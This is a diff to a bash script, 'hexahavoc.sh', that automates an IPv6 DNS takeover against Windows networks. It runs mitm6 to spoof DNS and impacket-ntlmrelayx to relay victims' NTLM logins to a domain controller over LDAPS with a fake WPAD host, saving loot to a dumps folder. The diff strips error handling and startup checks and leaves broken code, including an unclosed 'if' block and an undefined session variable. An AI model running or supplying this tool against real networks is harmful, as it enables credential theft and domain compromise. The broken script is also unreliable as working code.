@@ -1,6 +1,4 @@
 #!/bin/bash
-set -euo pipefail
-IFS=$'\n\t'
 
 # ===============================================================
 # hexahavoc.sh - IPv6 DNS Takeover Automation Script
@@ -25,11 +23,6 @@ silent=0
 loot_dir="dumps"
 session_name=""
 
-cleanup() {
-  echo -e "${YELLOW}Cleaning up session...${RESET}"
-  tmux has-session -t "$session_name" 2>/dev/null && \
-  tmux kill-session -t "$session_name" 2>/dev/null || true
-}
 
 # Print usage information
 usage() {
@@ -60,6 +53,7 @@ banner() {
   echo -e "${RESET}"
 }                                                      
 
+
 # Parse command-line arguments
 while getopts ":d:t:i:l:vs" opt; do
   case "$opt" in
@@ -72,6 +66,8 @@ while getopts ":d:t:i:l:vs" opt; do
     \?) usage ;;
   esac
 done
+
+
 
 # Check if a command exists
 check_command() {
@@ -86,8 +82,6 @@ if [ "$verbose" -eq 1 ] && [ "$silent" -eq 1 ]; then
   echo -e "${RED}Error: -v and -s flags cannot be used together.${RESET}"
   exit 1
 fi
-
-[[ "$verbose" -eq 1 ]] && set -x
 
 # Ensure required arguments are provided
 if [ -z "$target_domain" ] || [ -z "$target_ip" ]; then
@@ -134,30 +128,23 @@ if [ "$EUID" -ne 0 ]; then
 fi
 
 safe_domain="${target_domain//[^a-zA-Z0-9]/_}"
-session_name="ipv6_dns_takeover_${safe_domain}_$(date +%H%M%S)"
-log_file="$loot_dir/hexahavoc_$(date +%F_%H-%M-%S).log"
-
-trap cleanup INT TERM
+session_name="ipv6_dns_takeover_${safe_domain}"
 
 # Create loot directory if it doesn't exist
-mkdir -p "$loot_dir"
-
-# Suppress console output if silent mode is enabled
-if [[ "$silent" -eq 1 ]]; then
-  exec >>"$log_file" 2>&1
+if [ ! -d "$loot_dir" ]; then
+  mkdir -p "$loot_dir"
 else
-  exec > >(tee -a "$log_file") 2>&1
+  echo -e "${YELLOW}Warning: Loot directory '$loot_dir' already exists. Results may be overwritten.${RESET}"
 fi
 
 # Show the banner
 banner
 
-# Create a new tmux session
-tmux has-session -t "$session_name" 2>/dev/null && {
-  echo -e "${RED}Session already exists${RESET}"
-  exit 1
-}
+# Check if tmux session exists
+if tmux has-session -t "$session_name" 2>/dev/null; then
+  echo -e "${YELLOW}[!] Tmux session '${session_name}' already exists.${RESET}"
 
+# Create a new tmux session
 echo -e "${CYAN}Creating a new tmux session named '$session_name'...${RESET}"
 tmux new-session -d -s "$session_name" || {
   echo -e "${RED}Failed to create tmux session${RESET}"
@@ -166,74 +153,27 @@ tmux new-session -d -s "$session_name" || {
 
 # Function to start a tmux window
 start_tmux_window() {
-  local session="$1"
-  local window_name="$2"
-  local command="$3"
-  
+  local session_name=$1
+  local window_name=$2
+  local command=$3
   tmux new-window -t "$session" -n "$window_name" || {
     echo "Failed to create window"
     exit 1
   }
-  tmux send-keys -t "$session:$window_name" \
-    "bash -lc $(printf '%q' "$command")" C-m
+  tmux send-keys -t "$session_name:$window_name" "$command" C-m
 }
 
 # Start mitm6 in tmux session
 echo -e "${CYAN}Starting mitm6 on interface $interface for domain $target_domain...${RESET}"
-start_tmux_window "$session_name" "mitm6" \
-"mitm6 -i \"$interface\" -d \"$target_domain\"" || {
+start_tmux_window "$session_name" "mitm6" "mitm6 -i \"$interface\" -d \"$target_domain\"" || {
   echo -e "${RED}Failed to start mitm6.${RESET}"
-  exit 1
-}
-
-started=0
-for i in {1..5}; do
-  if pgrep -fa "mitm6.*$target_domain" >/dev/null; then
-    started=1
-    break
-  fi
-  sleep 1
-done
-
-[[ "$started" -eq 1 ]] || {
-  echo -e "${RED}mitm6 failed to start${RESET}"
   exit 1
 }
 
 # Start impacket-ntlmrelayx in tmux session
 echo -e "${CYAN}Starting impacket-ntlmrelayx...${RESET}"
-start_tmux_window "$session_name" "impacket-ntlmrelayx" \
-"impacket-ntlmrelayx -6 -t ldaps://$target_ip -wh fakewpad.$target_domain -l $loot_dir" || {
+start_tmux_window "$session_name" "impacket-ntlmrelayx" "impacket-ntlmrelayx -6 -t ldaps://$target_ip -wh fakewpad.$target_domain -l $loot_dir" || {
   echo -e "${RED}Failed to start impacket-ntlmrelayx.${RESET}"
-  exit 1
-}
-
-# give tmux + python spawn chain time to fully initialize
-sleep 4
-
-started=0
-
-for i in {1..15}; do
-  # ensure real process (not shell wrapper)
-  if pgrep -fa "ntlmrelayx.*$target_ip" | grep -v "bash -lc" >/dev/null; then
-
-    # ensure socket is actually bound AND persistent
-    if ss -lntp 2>/dev/null | grep -q "ntlmrelayx"; then
-      sleep 1
-
-      # second confirmation pass (important)
-      ss -lntp 2>/dev/null | grep -q "ntlmrelayx" && {
-        started=1
-        break
-      }
-    fi
-  fi
-
-  sleep 1
-done
-
-[[ "$started" -eq 1 ]] || {
-  echo -e "${RED}ntlmrelayx failed stability check${RESET}"
   exit 1
 }
 
@@ -245,7 +185,7 @@ fi
 
 # Attach to the tmux session
 echo -e "${GREEN}Attaching to the tmux session '$session_name'...${RESET}"
-tmux attach-session -t "$session_name" || {
+tmux -CC attach-session -t "$session_name" || {
   echo -e "${RED}Failed to attach to session${RESET}"
   exit 1
 }
